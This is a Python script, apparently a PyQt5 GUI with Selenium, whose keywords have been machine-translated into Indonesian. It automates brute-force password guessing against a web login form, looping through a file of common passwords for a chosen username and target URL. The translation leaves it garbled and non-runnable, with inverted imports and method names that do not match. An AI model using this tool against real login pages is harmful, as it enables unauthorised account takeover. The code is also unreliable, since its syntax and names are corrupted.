dari QtWidgets impor PyQt5, QtCore, QtGui, QtWidgets
dari mainWindow impor Ui_MainWindow
impor   sys, os
dari webdriver impor selenium
waktu impor


kelas  execc :
    progress_value =  0
    stop_progress =  Salah
    def  __init__ ( diri ):
        app = QtWidgets.QApplication (sys.argv)
        MainWindow = QtWidgets.QMainWindow ()
        diri Ui = Ui_MainWindow ()
        self .ui.setupUi (MainWindow)
        self .ui.pushButton_2.clicked.connect ( self . mengirimkan )
        self .ui.pushButton_3.clicked.connect (os._exit)
        MainWindow.show ()
        sys.exit (app.exec_ ())

    def  submit ( diri ):
        coba :

            url1 =  self .ui.lineEdit.text ()
            userName =  self .ui.lineEdit_2.text ()
            UserCSS =  self .ui.lineEdit_3.text ()
            PasswordCSS =  self .ui.lineEdit_4.text ()
            SubmitCSS =  self .ui.lineEdit_6.text ()
            Rate =  float ( self .ui.lineEdit_5.text ())

            if (url1 ==  " "  atau userName ==  " "  atau UserCSS ==  " "  atau PasswordCSS ==  " "  atau Rate ==  " " atau SubmitCSS ==  " " ):
                print ( " Isi semua info " )
                kembali


            browser = webdriver.Firefox ()   # Membuka Browser
            browser.get (url1)   # Buka url Target di browser

            password =  open ( ' passwords.txt ' )   # File teks ini berisi kata sandi yang paling umum

            untuk pola dalam kata sandi:   # Periksa semua pola dalam kata sandi
                coba :
                    userElem = browser.find_element_by_css_selector (UserCSS)   # Arahkan ke Bidang UserName
                    userElem.send_keys (userName) # Ketikkan   Username target
                    passElem = browser.find_element_by_css_selector (PasswordCSS)   # Arahkan ke Bidang Kata Sandi
                    passElem.send_keys (pattern)   # Jenis pola dalam kata sandi
                    submit = browser.find_element_by_css_selector (SubmitCSS)   # Arahkan ke Tombol Kirim
                    submit.click ()   # Klik pada tombol submit
                    time.sleep (Rate)   # Menunggu halaman untuk mendapatkan penyegaran
                kecuali :
                    print ( " Successful " )   # Cetak pesan Sukses
                    break   # Breaks the loop

            password.close ()   # Tutup File

        kecuali :
            print ( ' Silakan isi formulir dengan benar ' )


jika  __name__  ==  " __main__ " :
    execc ()
